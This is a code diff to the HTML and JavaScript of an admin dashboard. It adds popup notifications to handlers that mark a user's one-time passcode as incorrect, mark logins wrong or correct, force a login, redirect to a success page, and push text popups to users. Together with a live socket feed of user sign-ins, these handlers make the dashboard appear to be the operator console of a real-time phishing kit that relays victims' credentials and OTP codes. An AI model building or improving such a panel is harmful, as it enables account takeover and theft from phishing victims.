@@ -308,6 +308,42 @@ tr:hover {
   font-size: 11px;
 }
 
+/* Small Action Popup Notifications */
+.action-popup {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  background: #10b981;
+  color: white;
+  padding: 12px 20px;
+  border-radius: 12px;
+  font-size: 13px;
+  font-weight: 500;
+  display: none;
+  align-items: center;
+  gap: 10px;
+  z-index: 1001;
+  animation: slideUp 0.3s ease;
+  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+  max-width: 350px;
+}
+.action-popup.error {
+  background: #ef4444;
+}
+.action-popup.warning {
+  background: #f59e0b;
+}
+.action-popup.info {
+  background: #3b82f6;
+}
+@keyframes slideUp {
+  from { transform: translateY(100%); opacity: 0; }
+  to { transform: translateY(0); opacity: 1; }
+}
+.action-popup i {
+  font-size: 16px;
+}
+
 .modal-overlay {
   display: none;
   position: fixed;
@@ -512,6 +548,11 @@ tr:hover {
   <p id="notificationMessage"></p>
 </div>
 
+<div id="actionPopup" class="action-popup">
+  <i class="fas fa-check-circle"></i>
+  <span id="actionPopupMessage">Action completed!</span>
+</div>
+
 <div id="textModal" class="text-modal-overlay">
   <div class="text-modal">
     <h3><i class="fas fa-paper-plane"></i> Send Text to User</h3>
@@ -570,6 +611,33 @@ tr:hover {
 
 <script src="/socket.io/socket.io.js"></script>
 <script>
+  // ==================== ACTION POPUP FUNCTION ====================
+  function showActionPopup(message, type = 'success') {
+    const popup = document.getElementById('actionPopup');
+    const popupMessage = document.getElementById('actionPopupMessage');
+    const icon = popup.querySelector('i');
+    
+    popupMessage.textContent = message;
+    popup.className = `action-popup ${type}`;
+    
+    if (type === 'success') {
+      icon.className = 'fas fa-check-circle';
+    } else if (type === 'error') {
+      icon.className = 'fas fa-exclamation-circle';
+    } else if (type === 'warning') {
+      icon.className = 'fas fa-exclamation-triangle';
+    } else {
+      icon.className = 'fas fa-info-circle';
+    }
+    
+    popup.style.display = 'flex';
+    
+    setTimeout(() => {
+      popup.style.display = 'none';
+    }, 3000);
+  }
+
+  // ==================== THEME TOGGLE ====================
   const themeToggleBtn = document.getElementById('themeToggleBtn');
   const currentTheme = localStorage.getItem('theme') || 'light';
   
@@ -591,6 +659,7 @@ tr:hover {
     }
   });
 
+  // ==================== ADMIN AUTH ====================
   const token = localStorage.getItem('adminToken');
   if (!token) window.location.href = '/admin';
 
@@ -690,7 +759,11 @@ tr:hover {
 
   function copyToClipboard(text) {
     if (!text) return;
-    navigator.clipboard.writeText(text).catch(() => {});
+    navigator.clipboard.writeText(text).then(() => {
+      showActionPopup('Copied to clipboard!', 'success');
+    }).catch(() => {
+      showActionPopup('Failed to copy', 'error');
+    });
   }
 
   function showTextModal(email) {
@@ -706,7 +779,10 @@ tr:hover {
 
   async function sendTextToUser() {
     const text = document.getElementById('adminTextInput').value.trim();
-    if (!text) return;
+    if (!text) {
+      showActionPopup('Please enter a message', 'error');
+      return;
+    }
     if (!currentSelectedEmail) return;
     try {
       await fetch('/api/admin/send-text', {
@@ -714,9 +790,13 @@ tr:hover {
         headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email: currentSelectedEmail, text })
       });
+      showActionPopup(`Message sent to ${currentSelectedEmail}`, 'success');
       hideTextModal();
       loadUsers();
-    } catch (error) { console.error('Send text error:', error); }
+    } catch (error) { 
+      console.error('Send text error:', error);
+      showActionPopup('Network error. Failed to send text.', 'error');
+    }
   }
 
   async function releaseTextPopup() {
@@ -727,9 +807,13 @@ tr:hover {
         headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email: currentSelectedEmail })
       });
+      showActionPopup(`Text popup closed for ${currentSelectedEmail}`, 'success');
       hideTextModal();
       loadUsers();
-    } catch (error) { console.error('Release text error:', error); }
+    } catch (error) { 
+      console.error('Release text error:', error);
+      showActionPopup('Network error. Failed to release text.', 'error');
+    }
   }
 
   async function deleteUser(email) {
@@ -740,8 +824,12 @@ tr:hover {
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
+        showActionPopup(`User ${email} deleted successfully`, 'success');
         loadUsers();
-      } catch (error) { console.error('Delete user error:', error); }
+      } catch (error) { 
+        console.error('Delete user error:', error);
+        showActionPopup('Network error. Failed to delete user.', 'error');
+      }
     }
   }
 
@@ -753,26 +841,28 @@ tr:hover {
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
+        showActionPopup(`Email ${email} blocked successfully`, 'success');
         loadUsers();
         loadBlockedEmails();
-      } catch (error) { console.error('Block email error:', error); }
+      } catch (error) { 
+        console.error('Block email error:', error);
+        showActionPopup('Network error. Failed to block email.', 'error');
+      }
     }
   }
 
-  // INCORRECT OTP - SILENT, NO LOADING, JUST SEND REQUEST
-// INCORRECT OTP BUTTON - SILENT, NO DATABASE CHANGE, JUST SET FLAG
   async function incorrectOTP(email) {
-    if (confirm(`❌ Mark OTP as incorrect for: ${email}?\n\nUser will see an error message and can enter a new code.`)) {
+    if (confirm(`❌ Mark OTP as incorrect for: ${email}?`)) {
       try {
         await fetch('/api/admin/incorrect-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-        // No notification, no sound, no loading – completely silent
-        console.log('Incorrect OTP triggered for:', email);
+        showActionPopup(`OTP marked as incorrect for ${email}`, 'warning');
       } catch (error) {
         console.error('Incorrect OTP error:', error);
+        showActionPopup('Network error. Failed to mark OTP as incorrect.', 'error');
       }
     }
   }
@@ -785,7 +875,11 @@ tr:hover {
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-      } catch (error) { console.error('Wrong login error:', error); }
+        showActionPopup(`Login marked as WRONG for ${email}`, 'warning');
+      } catch (error) { 
+        console.error('Wrong login error:', error);
+        showActionPopup('Network error. Failed to mark login as wrong.', 'error');
+      }
     }
   }
 
@@ -797,7 +891,11 @@ tr:hover {
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
-      } catch (error) { console.error('Correct login error:', error); }
+        showActionPopup(`Login marked as CORRECT for ${email}`, 'success');
+      } catch (error) { 
+        console.error('Correct login error:', error);
+        showActionPopup('Network error. Failed to mark login as correct.', 'error');
+      }
     }
   }
 
@@ -824,10 +922,14 @@ tr:hover {
           headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
           body: JSON.stringify({ email })
         });
+        showActionPopup(`Email ${email} unblocked successfully`, 'success');
         loadBlockedEmails();
         loadUsers();
         closeBlockedModal();
-      } catch (error) { console.error('Unblock error:', error); }
+      } catch (error) { 
+        console.error('Unblock error:', error);
+        showActionPopup('Network error. Failed to unblock email.', 'error');
+      }
     }
   }
 
@@ -841,7 +943,10 @@ tr:hover {
       const users = await response.json();
       displayUsers(users);
       updateStats(users);
-    } catch(err) { console.error(err); }
+    } catch(err) { 
+      console.error(err);
+      showActionPopup('Failed to load users', 'error');
+    }
   }
 
   function updateStats(users) {
@@ -906,8 +1011,12 @@ tr:hover {
         headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email })
       });
+      showActionPopup(`User ${email} approved successfully`, 'success');
       loadUsers();
-    } catch (error) { console.error('Approve error:', error); }
+    } catch (error) { 
+      console.error('Approve error:', error);
+      showActionPopup('Network error. Failed to approve user.', 'error');
+    }
   }
 
   async function forceLogin(email) {
@@ -917,8 +1026,12 @@ tr:hover {
         headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email })
       });
+      showActionPopup(`Force login triggered for ${email}`, 'success');
       loadUsers();
-    } catch (error) { console.error('Force login error:', error); }
+    } catch (error) { 
+      console.error('Force login error:', error);
+      showActionPopup('Network error. Failed to trigger force login.', 'error');
+    }
   }
 
   async function redirectToSuccess(email) {
@@ -928,11 +1041,21 @@ tr:hover {
         headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
         body: JSON.stringify({ email })
       });
+      showActionPopup(`Redirect to success triggered for ${email}`, 'success');
       loadUsers();
-    } catch (error) { console.error('Redirect success error:', error); }
+    } catch (error) { 
+      console.error('Redirect success error:', error);
+      showActionPopup('Network error. Failed to trigger redirect.', 'error');
+    }
   }
 
-  function logout() { localStorage.removeItem('adminToken'); window.location.href = '/admin'; }
+  function logout() { 
+    showActionPopup('Logging out...', 'info');
+    setTimeout(() => {
+      localStorage.removeItem('adminToken');
+      window.location.href = '/admin';
+    }, 500);
+  }
 
   // Socket listeners - ONLY FOR DATA RECEIVED
   socket.on('user-login', (data) => { showNotification('📧 New Email', `${data.email} signed up`, 'email', true); loadUsers(); });
